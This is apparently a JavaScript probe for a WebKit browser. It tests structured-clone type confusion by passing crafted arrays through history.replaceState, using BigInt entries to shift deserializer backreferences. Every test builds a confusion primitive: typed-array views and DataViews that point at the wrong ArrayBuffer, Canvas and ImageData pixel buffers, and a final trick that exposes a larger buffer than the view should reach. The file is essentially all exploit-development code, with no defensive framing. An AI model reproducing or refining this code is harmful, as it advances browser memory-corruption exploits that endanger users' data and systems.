// WebCore + advanced SC probe for WebKit 613.0
// Tests DOM-level bugs and exotic structured clone confusion
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

// ─── DOM feature detection ───
test('dom_features', function() {
  return {
    result: 'features',
    canvas: !!document.createElement('canvas').getContext,
    canvas2d: !!document.createElement('canvas').getContext('2d'),
    webgl: !!(document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl')),
    svg: !!document.createElementNS('http://www.w3.org/2000/svg', 'svg').createSVGRect,
    audio: !!document.createElement('audio').canPlayType,
    video: !!document.createElement('video').canPlayType,
    offscreen: typeof OffscreenCanvas !== 'undefined',
    imageData: typeof ImageData !== 'undefined',
    imageBitmap: typeof createImageBitmap !== 'undefined',
    blob: typeof Blob !== 'undefined',
    file: typeof File !== 'undefined',
    fileReader: typeof FileReader !== 'undefined',
    url: typeof URL !== 'undefined',
    urlObj: typeof URL.createObjectURL === 'function',
    crypto: typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function',
    subtle: typeof crypto !== 'undefined' && typeof crypto.subtle !== 'undefined',
    fetch: typeof fetch === 'function',
    stream: typeof ReadableStream !== 'undefined',
    mutation: typeof MutationObserver !== 'undefined',
    intersection: typeof IntersectionObserver !== 'undefined',
    resize: typeof ResizeObserver !== 'undefined'
  };
});

// ─── SC with ImageData (transferable cloning with pixel buffer) ───
test('sc_imagedata', function() {
  if (typeof ImageData === 'undefined') return { result: 'no_imagedata' };

  // ImageData has a Uint8ClampedArray buffer internally
  // Can we confuse an ImageData's backing buffer?
  var img = new ImageData(16, 16); // 16x16 = 1024 bytes RGBA
  var imgBuf = img.data.buffer;
  var imgSize = imgBuf.byteLength; // 1024

  var target = new ArrayBuffer(imgSize);
  new Uint8Array(target).fill(0xCC);

  // Pattern: [BigInt, target, v1(imgBuf), v2(imgBuf)]
  // v2's buffer backref shifts → target
  var v1 = new Uint8Array(imgBuf);
  var v2 = new Uint8Array(imgBuf);

  var filler = [1n, target, v1, v2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!(cv instanceof Uint8Array)) return { result: 'not_u8', type: typeof cv };

  return {
    result: cv[0] === 0xCC ? 'CONFUSED_IMGDATA' : 'not_confused',
    byte0: cv[0],
    len: cv.length,
    bufLen: cv.buffer.byteLength
  };
});

// ─── SC with Blob (if serializable) ───
test('sc_blob', function() {
  if (typeof Blob === 'undefined') return { result: 'no_blob' };

  try {
    var blob = new Blob(['test data 12345'], { type: 'text/plain' });
    history.replaceState({ b: blob }, '');
    var c = history.state;
    history.replaceState(null, '');
    return {
      result: c && c.b instanceof Blob ? 'blob_cloneable' : 'blob_not_cloned',
      size: c && c.b ? c.b.size : null
    };
  } catch(e) {
    return { result: 'blob_error', msg: e.message.substring(0, 60) };
  }
});

// ─── SC with Map/Set (complex pool interactions) ───
test('sc_map_confusion', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xAA);

  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xBB);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  // Wrap in a Map to change serialization order / pool structure
  var m = new Map();
  m.set('buf', v1);
  m.set('ref', v2);

  var filler = [1n, target, m];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cm = c[0][2];
  if (!(cm instanceof Map)) return { result: 'not_map', type: typeof cm };

  var cRef = cm.get('ref');
  if (!(cRef instanceof Uint8Array)) return { result: 'ref_not_u8', type: typeof cRef };

  return {
    result: cRef[0] === 0xAA ? 'MAP_CONFUSED' : 'not_confused',
    byte0: cRef[0],
    len: cRef.length,
    bufLen: cRef.buffer.byteLength
  };
});

// ─── Canvas pixel data → buffer confusion ───
test('canvas_buf_confusion', function() {
  var canvas = document.createElement('canvas');
  canvas.width = 4; canvas.height = 4;
  var ctx = canvas.getContext('2d');
  if (!ctx) return { result: 'no_ctx' };

  // Draw something recognizable
  ctx.fillStyle = '#ff0000';
  ctx.fillRect(0, 0, 4, 4);

  var imgData = ctx.getImageData(0, 0, 4, 4);
  // imgData.data is Uint8ClampedArray, 64 bytes (4*4*4 RGBA)
  var pixBuf = imgData.data.buffer;

  // Same confusion pattern with a target of matching size
  var target = new ArrayBuffer(pixBuf.byteLength);
  var tv = new Uint8Array(target);
  // Write a fake pixel pattern
  for (var i = 0; i < tv.length; i += 4) {
    tv[i] = 0x00;   // R
    tv[i+1] = 0xFF; // G
    tv[i+2] = 0x00; // B
    tv[i+3] = 0xFF; // A
  }

  var v1 = new Uint8Array(pixBuf);
  var v2 = new Uint8Array(pixBuf);

  var filler = [1n, target, v1, v2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!(cv instanceof Uint8Array)) return { result: 'not_u8' };

  // Check if confused — green pixels (from target) vs red (from canvas)
  return {
    result: cv[1] === 0xFF && cv[0] === 0x00 ? 'CONFUSED_CANVAS' : 'not_confused',
    rgba0: [cv[0], cv[1], cv[2], cv[3]],
    len: cv.length
  };
});

// ─── Try Uint8ClampedArray confusion (different validation path?) ───
test('clamped_confusion', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0x77);

  var source = new ArrayBuffer(64);
  var v1 = new Uint8ClampedArray(source);
  v1.fill(0x88);
  var v2 = new Uint8ClampedArray(source);

  var filler = [1n, target, v1, v2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!cv) return { result: 'null_view' };
  var isClamped = cv instanceof Uint8ClampedArray;
  var isU8 = cv instanceof Uint8Array;

  return {
    result: cv[0] === 0x77 ? 'CONFUSED' : 'not_confused',
    byte0: cv[0],
    isClamped: isClamped,
    isU8: isU8,
    ctor: cv.constructor ? cv.constructor.name : '?',
    len: cv.length,
    bufLen: cv.buffer.byteLength
  };
});

// ─── DataView confusion (different TypedArray family) ───
test('dataview_confusion', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xDE);

  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x00);
  var v1 = new DataView(source);
  var v2 = new DataView(source);

  var filler = [1n, target, v1, v2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][3];
  if (!cv) return { result: 'null_view' };
  var isDV = cv instanceof DataView;

  if (isDV) {
    return {
      result: cv.getUint8(0) === 0xDE ? 'CONFUSED_DV' : 'not_confused',
      byte0: cv.getUint8(0),
      bufLen: cv.buffer.byteLength,
      byteLen: cv.byteLength
    };
  }

  return {
    result: 'not_dataview',
    type: typeof cv,
    ctor: cv.constructor ? cv.constructor.name : '?'
  };
});

// ─── Test multiple BigInt shift amounts with view confusion ───
test('shift2_views', function() {
  // With 2 BigInts: shift = 2
  // We need to place the target buffer 2 slots before source
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0x55);
  var pad = new ArrayBuffer(64); // spacer
  new Uint8Array(pad).fill(0x99);

  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x66);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  // With shift=2, v2.buffer backref to source resolves to target (2 slots earlier)
  // Pool: target=P, pad=P+1, source=P+2 (serializer, BigInts skipped)
  // Deserializer: BigInt1=P, BigInt2=P+1, target=P+2, pad=P+3, source=P+4
  // v2.buffer backref(P+2) → deserializer pool[P+2] = target ← CONFUSED!
  var filler = [1n, 2n, target, pad, v1, v2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][5]; // v2 is at filler index 5
  if (!cv) return { result: 'null_view' };
  if (!(cv instanceof Uint8Array)) return { result: 'not_u8', type: typeof cv };

  return {
    result: cv[0] === 0x55 ? 'CONFUSED_SHIFT2' : (cv[0] === 0x99 ? 'confused_pad' : 'byte_' + cv[0].toString(16)),
    byte0: cv[0],
    len: cv.length,
    bufLen: cv.buffer.byteLength
  };
});

// ─── Test: confuse view with DIFFERENT size using shift=2 (pad buffer absorbs) ───
test('shift2_size_trick', function() {
  // Idea: with shift=2, backref resolves 2 entries earlier
  // If we carefully place a LARGE buffer where backref lands, and source is SMALL...
  // Source (small) gets serialized with small view. Backref points to large buffer.
  // View length = small, buffer = large → valid (small view on large buffer)
  // Then we have a view that EXPOSES extra buffer data

  var largeBuf = new ArrayBuffer(1024);
  var lv = new Uint8Array(largeBuf);
  for (var i = 0; i < 1024; i++) lv[i] = i & 0xFF;
  var padBuf = new ArrayBuffer(32);

  var smallBuf = new ArrayBuffer(32);
  new Uint8Array(smallBuf).fill(0xAA);
  var sv1 = new Uint8Array(smallBuf);
  var sv2 = new Uint8Array(smallBuf);

  // shift=2: sv2.buffer backref to smallBuf(serializer pool P+2) → deserializer pool[P+2] = largeBuf
  var filler = [1n, 2n, largeBuf, padBuf, sv1, sv2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var cv = c[0][5]; // sv2 at filler index 5
  if (!cv) return { result: 'null_view' };
  if (!(cv instanceof Uint8Array)) return { result: 'not_u8', type: typeof cv };

  // View length should be 32 (from smallBuf), but buffer is 1024 (largeBuf)
  // We can create a NEW view of the buffer to access all 1024 bytes!
  var fullView = null;
  try {
    fullView = new Uint8Array(cv.buffer);
  } catch(e) {
    return { result: 'fullview_error', msg: e.message };
  }

  return {
    result: cv.buffer.byteLength === 1024 ? 'LARGE_BUF_ACCESS' : 'wrong_size',
    viewLen: cv.length,
    bufLen: cv.buffer.byteLength,
    byte0: cv[0],
    fullViewLen: fullView ? fullView.length : -1,
    // Can we read data from the large buffer through the full view?
    sample: fullView ? [fullView[0], fullView[31], fullView[32], fullView[100], fullView[1023]] : null
  };
});

return JSON.stringify(results);
})();
